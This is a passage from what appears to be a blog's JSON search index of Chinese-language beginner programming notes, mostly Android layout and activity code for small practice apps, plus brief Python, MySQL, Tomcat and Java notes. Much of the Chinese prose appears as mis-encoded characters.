android:text=&quot;+2 point&quot; android:layout_below=&quot;@+id/pointB_3&quot; android:onClick=&quot;addTwoTeamB&quot;/&gt; &lt;Button android:id=&quot;@+id/free_pointB&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginLeft=&quot;24dp&quot; android:layout_marginRight=&quot;24dp&quot; android:text=&quot;FREE POINT&quot; android:layout_below=&quot;@+id/pointB_2&quot; android:onClick=&quot;addOneTeamB&quot;/&gt; &lt;/RelativeLayout&gt; &lt;Button android:text=&quot;RESET&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentBottom=&quot;true&quot; android:layout_centerHorizontal=&quot;true&quot; android:onClick=&quot;reset&quot; android:layout_marginBottom=&quot;8dp&quot;/&gt; &lt;/RelativeLayout&gt;mainactivity.java package com.example.android.courtcounter; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.TextView; public class MainActivity extends AppCompatActivity { int scoreOfTeamA = 0; int scoreOfTeamB = 0; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } public void addOneTeamA(View view){ scoreOfTeamA += 1; displayForTeamA(scoreOfTeamA); } public void addTwoTeamA(View view){ scoreOfTeamA += 2; displayForTeamA(scoreOfTeamA); } public void addThreeTeamA(View view){ scoreOfTeamA += 3; displayForTeamA(scoreOfTeamA); } public void displayForTeamA(int number){ TextView totalScoreTextView = (TextView) findViewById(R.id.scoreA_text_view); totalScoreTextView.setText(number +&quot;&quot;); } public void addOneTeamB(View view){ scoreOfTeamB += 1; displayForTeamB(scoreOfTeamB); } public void addTwoTeamB(View view){ scoreOfTeamB += 2; displayForTeamB(scoreOfTeamB); } public void addThreeTeamB(View view){ scoreOfTeamB += 3; displayForTeamB(scoreOfTeamB); } public void displayForTeamB(int number){ TextView totalScoreTextView = (TextView) findViewById(R.id.scoreB_text_view); totalScoreTextView.setText(number +&quot;&quot;); } public void reset(View v){ scoreOfTeamA = 0; scoreOfTeamB = 0; displayForTeamA(0); displayForTeamB(0); } }styles.xml &lt;resources&gt; &lt;!-- Base application theme. --&gt; &lt;style name=&quot;AppTheme&quot; parent=&quot;Theme.AppCompat.Light.DarkActionBar&quot;&gt; &lt;!-- Primary theme color of the app (sets background color of app bar) --&gt; &lt;item name=&quot;colorPrimary&quot;&gt;#FF9800&lt;/item&gt; &lt;!-- Background color of buttons in the app --&gt; &lt;item name=&quot;colorButtonNormal&quot;&gt;#FF9800&lt;/item&gt; &lt;/style&gt; &lt;/resources&gt;é‡ç‚¹å†…å®¹ å°±æ˜¯ä¸­é—´çš„é‚£ä¸ªæ°´å¹³çº¿ï¼Œå…¶å®æ˜¯ä¸€ä¸ªviewï¼Œåªæ˜¯width = â€œ1dpâ€ï¼Œheightå’Œåˆ«çš„ä¸€æ · å½“ç„¶ï¼Œ3ä¸ªviewæ˜¯åµŒå¥—çš„ï¼Œæ˜¯å¹¶åˆ—å…³ç³»3.å¦‚æœæ„Ÿè§‰è‡ªå·±å†™çš„æ²¡é—®é¢˜ï¼Œå¯ä»¥ä¸€ç›´æŠ¥é”™ï¼Œè¯´æ‰¾ä¸åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥å°è¯•ï¼Œå°†appåˆ äº†ï¼Œé‡æ–°è£…ï¼Œå†æµ‹è¯•","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"justJavaå°å‹app","slug":"justJavaå°å‹app","date":"2017-09-09T13:21:39.000Z","updated":"2020-11-14T17:11:45.738Z","comments":true,"path":"2017/09/09/justJavaå°å‹app/","link":"","permalink":"http://yoursite.com/2017/09/09/justJava%E5%B0%8F%E5%9E%8Bapp/","excerpt":"","text":"activity_main.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot; android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot; android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot; android:paddingTop=&quot;@dimen/activity_vertical_margin&quot; android:orientation=&quot;vertical&quot; tools:context=&quot;com.husky.justjava.MainActivity&quot;&gt; &lt;TextView android:id=&quot;@+id/quantity&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;QUANTITY!&quot; android:textColor=&quot;@android:color/darker_gray&quot; android:textSize=&quot;25sp&quot; android:layout_marginBottom=&quot;16dp&quot; /&gt; &lt;RelativeLayout android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot;&gt; &lt;Button android:id=&quot;@+id/decrease&quot; android:text=&quot;+&quot; android:layout_width=&quot;48dp&quot; android:layout_height=&quot;48dp&quot; android:layout_alignParentLeft=&quot;true&quot; android:onClick=&quot;increment&quot;/&gt; &lt;TextView android:id=&quot;@+id/quantity_text_view&quot; android:text=&quot;0&quot; android:padding=&quot;10dp&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_toRightOf=&quot;@+id/decrease&quot; android:textSize=&quot;25sp&quot;/&gt; &lt;Button android:id=&quot;@+id/plus&quot; android:text=&quot;-&quot; android:layout_toRightOf=&quot;@+id/quantity_text_view&quot; android:layout_width=&quot;48dp&quot; android:layout_height=&quot;48dp&quot; android:onClick=&quot;decrement&quot;/&gt; &lt;/RelativeLayout&gt; &lt;TextView android:id=&quot;@+id/price&quot; android:text=&quot;PRICE&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:textSize=&quot;25sp&quot; /&gt; &lt;TextView android:id=&quot;@+id/price_text_view&quot; android:text=&quot;$0&quot; android:layout_marginTop=&quot;16dp&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:textSize=&quot;25sp&quot;/&gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;16dp&quot; android:text=&quot;ORDER&quot; android:onClick=&quot;submitOrder&quot;/&gt; &lt;/LinearLayout&gt;MainActivity.java package com.husky.justjava; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.TextView; import java.text.NumberFormat; /** * This app displays an order form to order coffee. */ public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } /** * This method is called when the order button is clicked. */ public void submitOrder(View view) { TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view); int numberOfCoffee = Integer.parseInt(quantityTextView.getText().toString()); // display(numberOfCoffee); // displayPrice(numberOfCoffee * 5); String priceMessage = &quot;$ &quot;+(numberOfCoffee*5)+&quot;\\n&quot;+&quot;Thank you!&quot;; displayMessage(priceMessage); } public void increment(View view){ TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view); int quantity = Integer.parseInt(quantityTextView.getText().toString())+1; display(quantity); } public void decrement(View view){ TextView quantityTextView = (TextView)findViewById(R.id.quantity_text_view); int quantity = Integer.parseInt(quantityTextView.getText().toString())-1; display(quantity); } /** * This method displays the given quantity value on the screen. */ private void display(int number) { TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view); quantityTextView.setText(&quot;&quot; + number); } private void displayPrice(int number){ TextView priceTextView= (TextView) findViewById(R.id.price_text_view); priceTextView.setText(NumberFormat.getCurrencyInstance().format(number)); } /** * This method displays the given text on the screen. */ private void displayMessage(String message) { TextView priceTextView = (TextView) findViewById(R.id.price_text_view); priceTextView.setText(message); } }é‡ç‚¹å†…å®¹ Nested ViewGroupsåµŒå¥—çš„è§†å›¾ç»„å¯ä»¥åœ¨LinearLayoutä¸­åµŒå¥—RelativeLayout2.æŒ‰é’®çš„onClickæ–¹æ³•android:onClick=â€submitOrderâ€ï¼Œå½“ç„¶åœ¨MainActivity.javaä¸­è¦å†™è¿™ä¸ªæ–¹æ³•ï¼Œpublicvoid submitOrder(View view){} TextView quantityTextView = (TextView)findViewById(R.id.quantity_text_view);int quantity = Integer.parseInt(quantityTextView.getText().toString())-1; quantityTextView.setText(â€œâ€ + number);è¿™ä¸ªå¾ˆé‡è¦ï¼Œnumberæ˜¯intç±»å‹ï¼Œå¿…é¡»è¦è½¬å‹ï¼Œä¸ç„¶ä¼šä¸€ç›´æŠ¥é”™ï¼Œâ€â€ + numberï¼Œæˆ–è€…scoreView.setText(String.valueOf(score)); priceTextView.setText(NumberFormat.getCurrencyInstance().format(number));åªæ˜¯å°†æ•°å­—å‰é¢è½¬å‹æˆå­—ç¬¦ï¼Œè­¬å¦‚10æ•°å­—ï¼Œè½¬å‹æˆï¿¥10 6. é¢˜å¤–è¯ï¼Œå¦‚æœè¦å­¦ä¹ androidï¼Œå¾ˆæ¨è https://cn.udacity.com/ ä¼˜è¾¾å­¦åŸ","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"è´ºå¡åº”ç”¨","slug":"è´ºå¡åº”ç”¨","date":"2017-09-08T01:39:19.000Z","updated":"2020-11-14T17:11:47.039Z","comments":true,"path":"2017/09/08/è´ºå¡åº”ç”¨/","link":"","permalink":"http://yoursite.com/2017/09/08/%E8%B4%BA%E5%8D%A1%E5%BA%94%E7%94%A8/","excerpt":"","text":"&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;com.husky.happybirthday.MainActivity&quot;&gt; &lt;ImageView android:src=&quot;@drawable/party&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:scaleType=&quot;centerCrop&quot;/&gt; &lt;TextView android:text=&quot;Happy Birthday,Ben!&quot; android:fontFamily=&quot;sans-serif-light&quot; android:textColor=&quot;@android:color/white&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentLeft=&quot;true&quot; android:layout_alignParentTop=&quot;true&quot; android:paddingLeft=&quot;20dp&quot; android:paddingTop=&quot;20dp&quot; android:textSize=&quot;30sp&quot; /&gt; &lt;TextView android:text=&quot;From Adios&quot; android:fontFamily=&quot;sans-serif-light&quot; android:textColor=&quot;@android:color/white&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentBottom=&quot;true&quot; android:layout_alignParentRight=&quot;true&quot; android:paddingRight=&quot;20dp&quot; android:paddingBottom=&quot;20dp&quot; android:textSize=&quot;30sp&quot; /&gt; &lt;/RelativeLayout&gt;æ•ˆæœ å®šä½ï¼Œé¦–å…ˆTextViewä¸­ï¼Œä½¿ç”¨android:layout_alignParentRight å…ˆåé¡ºåºï¼Œåº”è¯¥æ˜¯ImageViewï¼ŒTextView,TextView.è¿™æ ·å¯ä»¥ä¸ä¼šå°†æ–‡å­—è¦†ç›–æ‰ padding android:scaleType=â€centerCropâ€(1)å½“å›¾ç‰‡å¤§äºImageViewçš„å®½é«˜ï¼šä»¥å›¾ç‰‡çš„ä¸­å¿ƒç‚¹å’ŒImageViewçš„ä¸­å¿ƒç‚¹ä¸ºåŸºå‡†ï¼ŒæŒ‰æ¯”ä¾‹ç¼©å°å›¾ç‰‡ï¼Œç›´åˆ°å›¾ç‰‡çš„å®½é«˜æœ‰ä¸€è¾¹ç­‰äºImageViewçš„å®½é«˜ï¼Œåˆ™å¯¹äºå¦ä¸€è¾¹ï¼Œå›¾ç‰‡çš„é•¿åº¦å¤§äºæˆ–ç­‰äºImageViewçš„é•¿åº¦ï¼Œæœ€åç”¨ImageViewçš„å¤§å°å±…ä¸­æˆªå–è¯¥å›¾ç‰‡ã€‚(2)å½“å›¾ç‰‡å°äºImageViewçš„å®½é«˜ï¼šä»¥å›¾ç‰‡çš„ä¸­å¿ƒåº—å’ŒImageViewçš„ä¸­å¿ƒç‚¹ä¸ºåŸºå‡†ï¼ŒæŒ‰æ¯”ä¾‹æ‰©å¤§å›¾ç‰‡ï¼Œç›´åˆ°å›¾ç‰‡çš„å®½é«˜å¤§äºæˆ–ç­‰äºImageViewçš„å®½é«˜ï¼Œå¹¶æŒ‰ImageViewçš„å¤§å°å±…ä¸­æˆªå–è¯¥å›¾ç‰‡ã€‚","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"å†…è¾¹è·å’Œå¤–è¾¹è·","slug":"å†…è¾¹è·å’Œå¤–è¾¹è·","date":"2017-09-07T08:11:41.000Z","updated":"2020-11-14T17:11:48.378Z","comments":true,"path":"2017/09/07/å†…è¾¹è·å’Œå¤–è¾¹è·/","link":"","permalink":"http://yoursite.com/2017/09/07/%E5%86%85%E8%BE%B9%E8%B7%9D%E5%92%8C%E5%A4%96%E8%BE%B9%E8%B7%9D/","excerpt":"","text":"å…·ä½“ç”¨æ³•padding android:paddingLeft=&quot;16dp&quot; android:paddingRight=&quot;16dp&quot; è¿˜æœ‰ android:padding=&quot;16dp&quot;margin android:layout_margin=&quot;16dp&quot; æˆ–è€… android:layout_marginBottom=&quot;16dp&quot;","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"RelativeLayout","slug":"RelativeLayout","date":"2017-09-07T08:03:15.000Z","updated":"2020-11-14T17:11:48.844Z","comments":true,"path":"2017/09/07/RelativeLayout/","link":"","permalink":"http://yoursite.com/2017/09/07/RelativeLayout/","excerpt":"","text":"åŸºäºçˆ¶è§†å›¾ android:layout_alignParentTop If &quot;true&quot;, makes the top edge of this view match the top edge of the parent. è¿™æ˜¯å±…äºé¡¶éƒ¨ï¼Œå¦‚æœæ˜¯å·¦ä¸Šçš„è¯ï¼Œandroidï¼šlayout_alignParentTop=&quot;true&quot; android:layout_alignParentLeft=&quot;true&quot; å…¶ä»–çš„ä¸å†™ï¼Œé»˜è®¤æ˜¯false android:layout_centerVertical If &quot;true&quot;, centers this child vertically within its parent.åŸºäºå…¶ä»–è§†å›¾ android:layout_below Positions the top edge of this view below the view specified with a resource ID. android:layout_toRightOf Positions the left edge of this view to the right of the view specified with a resource ID.å…·ä½“åœ¨ https://developer.android.com/reference/android/widget/RelativeLayout.LayoutParams.html å¦‚æœidæ˜¯@+id/photoåœ¨ä¸‹é¢å¼•ç”¨æ—¶ï¼Œæ˜¯android:layout_toRightOf=â€@id/photoâ€","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"LinearLayout","slug":"LinearLayout","date":"2017-09-06T11:58:23.000Z","updated":"2020-11-14T17:11:49.498Z","comments":true,"path":"2017/09/06/LinearLayout/","link":"","permalink":"http://yoursite.com/2017/09/06/LinearLayout/","excerpt":"","text":"LinearLayout:æ°´å¹³å¸ƒå±€1.android:orientation Should the layout be a column or a row? Use â€œhorizontalâ€ for a row, â€œverticalâ€for a column. The default is horizontal.å‚ç›´å¸ƒå±€è¿˜æ˜¯æ°´å¹³å¸ƒå±€ 2.ç­‰é—´è·å¸ƒå±€æ°´å¹³ç­‰é—´è·åˆ†åˆ«ä»å·¦å¾€å³1.layout_width=â€0dpâ€layout_height=â€match_parentâ€layout_weight=â€1â€2.layout_width=â€0dpâ€layout_height=â€match_parentâ€layout_weight=â€2â€3.layout_width=â€0dpâ€layout_height=â€match_parentâ€layout_weight=â€1â€ é¦–å…ˆç¡®å®šæ˜¯æ°´å¹³ç­‰è·ç¦»è¿˜æ˜¯å‚ç›´ç­‰è·ç¦»ï¼Œç„¶åè®¾ç½®å®½æˆ–é«˜ä¸º0dpï¼Œç„¶åè®¾ç½®layout_weight.layout_weightå¦‚æœä¸è®¾ç½®ï¼Œé»˜è®¤æ˜¯0ï¼Œæ˜¯è¿™ä¸ªviewçš„é»˜è®¤å¤§å°","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"ImageView","slug":"ImageView","date":"2017-09-06T08:57:10.000Z","updated":"2020-11-14T17:11:50.602Z","comments":true,"path":"2017/09/06/ImageView/","link":"","permalink":"http://yoursite.com/2017/09/06/ImageView/","excerpt":"","text":"&lt;ImageView android:src=&quot;@drawable/gakki&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:scaleType=&quot;centerCrop&quot; /&gt;é¦–å…ˆåœ¨drawableé‡Œé¢å¯¼å…¥å›¾ç‰‡ï¼Œgakki.jpgç„¶åè°ƒç”¨æ—¶android:src=â€@drawable/gakkiâ€ï¼Œä¸ç”¨åŠ å›¾ç‰‡çš„æ‹“å±•åè¿™å¼ å›¾è½¬è½½æ¥è‡ª http://blog.csdn.net/u012947056/article/details/46816153 ä½¿ç”¨scaleType=â€centerCropâ€æ—¶ï¼Œæ˜¯æ— è¾¹æ¡†ï¼Œç»™äººèº«ä¸´å…¶å¢ƒçš„æ„Ÿè§‰ google chromeæœç´¢é¡µé¢ä¸­ä¿¡æ¯æ—¶ï¼Œwindows ctr+Fmac cmd+ F &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;TextView android:id=&quot;@+id/text_view_id&quot; android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;@string/hello&quot; /&gt; &lt;/LinearLayout&gt; public class MainActivity extends Activity { protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); final TextView helloTextView = (TextView) findViewById(R.id.text_view_id); helloTextView.setText(R.string.user_greeting); } This code sample demonstrates how to modify the contents of the text view defined in the previous XML layout:","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"android","slug":"android","permalink":"http://yoursite.com/tags/android/"}]},{"title":"android_TextView","slug":"android_TextView","date":"2017-09-06T07:46:04.000Z","updated":"2020-11-14T17:11:51.243Z","comments":true,"path":"2017/09/06/android_TextView/","link":"","permalink":"http://yoursite.com/2017/09/06/android_TextView/","excerpt":"","text":"XML:å¯æ‹“å±•æ ‡è®°è¯­è¨€px ï¼šæ˜¯å±å¹•çš„åƒç´ ç‚¹dp ï¼šä¸€ä¸ªåŸºäºdensityçš„æŠ½è±¡å•ä½ï¼Œå¦‚æœä¸€ä¸ª160dpiçš„å±å¹•ï¼Œ1dp=1pxdip ï¼šç­‰åŒäºdpsp ï¼šåŒdpç›¸ä¼¼ï¼Œä½†è¿˜ä¼šæ ¹æ®ç”¨æˆ·çš„å­—ä½“å¤§å°åå¥½æ¥ç¼©æ”¾(å»ºè®®ä½¿ç”¨spä½œä¸ºæ–‡æœ¬çš„å•ä½ï¼Œå…¶å®ƒç”¨dip) &lt;TextView &lt;/&gt; or &lt;TextView &gt; &lt;/TextView&gt;spandroid:textSize=â€56spâ€æˆ–è€…é‡‡ç”¨androidï¼štextAppearance=â€?android:textAppearanceLargeâ€ è¿˜æœ‰androidçš„é¢œè‰²è¡¨ https://material.io/guidelines/style/color.html#color-color-system","categories":[],"tags":[{"name":"androidå­¦ä¹ ç¬”è®°","slug":"androidå­¦ä¹ ç¬”è®°","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"androidæ—¥å¿—","slug":"androidæ—¥å¿—","permalink":"http://yoursite.com/tags/android%E6%97%A5%E5%BF%97/"}]},{"title":"pythonå†™å…¥mysqlä¹±ç ","slug":"pythonå†™å…¥mysqlä¹±ç ","date":"2017-06-07T08:04:49.000Z","updated":"2020-11-14T17:11:51.756Z","comments":true,"path":"2017/06/07/pythonå†™å…¥mysqlä¹±ç /","link":"","permalink":"http://yoursite.com/2017/06/07/python%E5%86%99%E5%85%A5mysql%E4%B9%B1%E7%A0%81/","excerpt":"","text":"mysqlæŸäººç¼–ç é¦–å…ˆè¦ä¿è¯mysqlé‡Œé¢çš„é»˜è®¤ç¼–ç æ˜¯utf-8ï¼Œå¯èƒ½æ˜¯Latin1ï¼Œæ‰€ä»¥ä½ è¦æ”¹æˆutf-8ï¼Œå¦‚æœæ•°æ®åº“æ–‡ä»¶ä¸é‡è¦çš„è¯ï¼Œå°±é‡è£…å§ï¼Œå®‰è£…çš„ä¼šæç¤ºé»˜è®¤ç¼–ç ï¼Œå¦‚æœé‡è¦çš„è¯ï¼Œä½ æœæœçœ‹ï¼Œå¯èƒ½æœ‰ä¿®æ”¹æ–¹æ³• pythonè¿æ¥æ•°æ®åº“ db=MySQLdb.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;*******&apos;,&apos;databaseName&apos;,charset=&apos;utf8&apos;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"å…¬ç½‘è®¿é—®é˜¿é‡Œäº‘tomcat","slug":"å…¬ç½‘è®¿é—®é˜¿é‡Œäº‘tomcat","date":"2017-05-30T08:22:15.000Z","updated":"2020-11-14T17:11:52.222Z","comments":true,"path":"2017/05/30/å…¬ç½‘è®¿é—®é˜¿é‡Œäº‘tomcat/","link":"","permalink":"http://yoursite.com/2017/05/30/%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E9%98%BF%E9%87%8C%E4%BA%91tomcat/","excerpt":"","text":"é¦–å…ˆä¿®æ”¹servlet.xmlportç«¯å£ä¿®æ”¹ä¸º80ç„¶åæ‰“å¼€é˜¿é‡Œäº‘é‡Œé¢çš„ç½‘ç»œå’Œå®‰å…¨-ã€‹å®‰å…¨ç»„-ã€‹é…ç½®è§„åˆ™-ã€‹æ·»åŠ å®‰å…¨ç»„è§„åˆ™å…·ä½“é‡Œé¢çš„åè®®ç±»å‹ï¼šhttp80æˆæƒå¯¹è±¡ï¼š0.0.0.0/0ç„¶åè¿æ¥ä¸€ä¸‹ï¼Œåº”è¯¥å¯ä»¥æˆåŠŸ","categories":[],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://yoursite.com/tags/tomcat/"},{"name":"é˜¿é‡Œäº‘","slug":"é˜¿é‡Œäº‘","permalink":"http://yoursite.com/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"}]},{"title":"linux tomcatå…·ä½“å®‰è£…","slug":"linux tomcatå…·ä½“å®‰è£…","date":"2017-05-29T08:32:17.000Z","updated":"2020-11-14T17:11:55.184Z","comments":true,"path":"2017/05/29/linux tomcatå…·ä½“å®‰è£…/","link":"","permalink":"http://yoursite.com/2017/05/29/linux%20tomcat%E5%85%B7%E4%BD%93%E5%AE%89%E8%A3%85/","excerpt":"","text":"å®‰è£… http://blog.csdn.net/carlos1992/article/details/43085897 ä½¿ç”¨ï¼š http://blog.csdn.net/liguu/article/details/41908529","categories":[],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://yoursite.com/tags/tomcat/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"mysql ä¸ java","slug":"mysql ä¸ java","date":"2017-04-27T02:52:16.000Z","updated":"2020-11-14T17:11:55.719Z","comments":true,"path":"2017/04/27/mysql ä¸ java/","link":"","permalink":"http://yoursite.com/2017/04/27/mysql%20%E4%B8%8E%20java/","excerpt":"","text":"æœ€è¿‘åœ¨windowsä¸‹å­¦ä¹ jdbc1.mysqlä¸‹è½½ http://download.csdn.net/download/tan3739/8855049 ä¸éœ€è¦ç§¯åˆ†ï¼ˆ0ç§¯åˆ†ï¼‰å®‰è£…çš„æ—¶å€™ï¼Œä¸€ç›´nextå°±è¡Œäº†ã€‚å…·ä½“çš„è‡ªè¡Œç™¾åº¦ 2.åœ¨cmd.exeè¿è¡Œmysqlå…ˆé…ç¯å¢ƒ http://jingyan.baidu.com/article/3ea51489e9998f52e61bbaf7.html ç„¶åç™»é™†ï¼Œåœ¨ç»ˆç«¯ç™»é™†ï¼šmysql -h localhost -u root -på›è½¦ç„¶åä¼šæç¤ºè¾“å…¥å¯†ç ï¼ˆè¿™ä¸ªåœ°æ–¹å¯èƒ½ä¼šæŠ¥é”™ï¼Œå¯èƒ½ä½ çš„mysqlæ²¡æœ‰å¯åŠ¨çš„åŸå› ï¼‰3.åŸºæœ¬æ“ä½œ http://blog.csdn.net/duguduchong/article/details/8790719 å‡ ä¹ä¸€æ ·ï¼Œå…ˆcreate database XXXï¼Œç„¶åcreate tableï¼ˆï¼‰ï¼›4.ä¸javaäº¤äº’ http://blog.csdn.net/haishu_zheng/article/details/50776439 http://blog.csdn.net/u013521637/article/details/48120955","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"jdbc","slug":"jdbc","permalink":"http://yoursite.com/tags/jdbc/"}]},{"title":"liståˆ‡ç‰‡(know how to slice sequences)","slug":"liståˆ‡ç‰‡(know how to slice sequences)","date":"2017-03-08T12:37:26.000Z","updated":"2020-11-14T17:11:56.220Z","comments":true,"path":"2017/03/08/liståˆ‡ç‰‡(know how to slice sequences)/","link":"","permalink":"http://yoursite.com/2017/03/08/list%E5%88%87%E7%89%87(know%20how%20to%20slice%20sequences)/","excerpt":"","text":"åˆšè¯»äº†Effective Python a = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] print(&apos;first four: &apos;,a[:4])#[&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;] print(&apos;Last four: &apos;,a[-4:])#[&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] print(&apos;Middle two: &apos;,a[3:-3])#[&apos;d&apos;,&apos;e&apos;] assert a[:5] == a[0:5] assert a[5:] == a[5:len(a)] a[:20] # [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] a[-20:] # [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] a[20] # IndexError: list index out of range a = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] a[2:7] = [99,22,14] print(a) #[&apos;a&apos;,&apos;b&apos;,99,22,14,&apos;h&apos;] b = a[:] assert b == a and b is not a b = a assert a is b # still the same list object avoid using start,end,and stride in a single slice[ start: end: stride] a = [&apos;red&apos;,&apos;orange&apos;,&apos;yellow&apos;,&apos;green&apos;,&apos;blue&apos;,&apos;purple&apos;] odds = a[::2] # [&apos;red&apos;,&apos;yellow&apos;,&apos;blue&apos;] evens = a[1::2] # [&apos;orange&apos;,&apos;green&apos;,&apos;purple&apos;] x = b&apos;mongoose&apos;# type(x) &lt;class &apos;bytes&apos;&gt;(in python3) y = x[::-1] print(y)# b&apos;esoognom&apos; #specifying start, end, and stride in a slice can be extremely confusing #prefer using positive stride values in slice widthout start or end indexs.Avoid negative stride values if possible","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Arrays.asList()","slug":"Arrays.asList()","date":"2017-03-04T02:59:14.000Z","updated":"2020-11-14T17:11:56.729Z","comments":true,"path":"2017/03/04/Arrays.asList()/","link":"","permalink":"http://yoursite.com/2017/03/04/Arrays.asList()/","excerpt":"","text":"asList public static &lt;T&gt; List&lt;T&gt; asList(T... a) Returns a fixed-size list backed by the specified array. (Changes to the returned list &quot;write through&quot; to the array.) This method acts as bridge between array-based and collection-based APIs, in combination with Collection.toArray(). The returned list is serializable and implements RandomAccess. This method also provides a convenient way to create a fixed-size list initialized to contain several elements: List&lt;String&gt; stooges = Arrays.asList(&quot;Larry&quot;, &quot;Moe&quot;, &quot;Curly&quot;); Parameters: a - 